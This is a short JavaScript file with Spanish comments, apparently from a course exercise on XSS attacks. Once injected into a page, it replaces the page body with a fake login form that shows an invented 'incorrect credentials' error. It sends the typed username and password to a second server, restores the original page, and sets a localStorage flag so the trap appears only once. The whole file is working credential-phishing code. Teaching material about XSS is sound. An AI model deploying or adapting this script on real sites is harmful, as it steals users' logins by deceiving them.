//Lo primero que hacemos es eliminar todo el contenido de la pagina
//que realmente se mostraria

let contenido
let body

function enviar(){
	//'<form action="http://localhost:8080/Ej08_XSS_EjemplosAtaque_Indeseables/peticion_inocente" method="post">'+
	let parametros = "login="+document.getElementById('login_').value+"&pw="+document.getElementById('pw_').value
	xmlhttp = new XMLHttpRequest();
	xmlhttp.open("post", "http://localhost:8081/Ej08_XSS_EjemplosAtaque_Indeseables/peticion_inocente?"+parametros,false);
	xmlhttp.send();
	//str1=xmlhttp.responseText;
	//alert(str1);
	body.innerHTML = contenido
}

function mostrarLogin(){

	body = document.getElementsByTagName("body")[0]
	contenido = body.innerHTML
	
	body.innerHTML = 
	`
	<h1 class="text-center">
		Pantalla de login, lo juro
	</h1>
	
	<br/> 
	
	<div class="row">
		<div class="col-xs-0 col-sm-4"></div>
		<div class="col-xs-12 col-sm-4">
			<div class="card card-primary">
				<div class="card-header">Acceso</div>
				<div class="card-body">
					<div class="form-horizontal" id="formulario">
						<div class="form-group">
							<label class="control-label col-xs-2" for="login">Login</label>
							<div class="col-xs-10">
								<input type="text" class="form-control" id="login_" />
							</div>
						</div>
						<div class="form-group">
							<label class="control-label col-xs-2" for="pw">Pw</label>
							<div class="col-xs-10">
								<input type="text" class="form-control" id="pw_" />
							</div>
						</div>
						
						<div class="alert alert-danger">
							<strong>Error.</strong> Credenciales incorrectas.
						</div>
	
						<div class="form-group">
							<div class="col-xs-2"></div>
							<div class="col-xs-8 text-right">
								<input type="button" class="btn btn-primary" onclick="enviar()" value="Entrar"/>
							</div>
						</div>
						
					</div>
				</div>
			</div>
		</div>
	</div>
	`
}

if(!localStorage.getItem("pillaste")){
	mostrarLogin()
	localStorage.setItem("pillaste", "a base de bien")
}



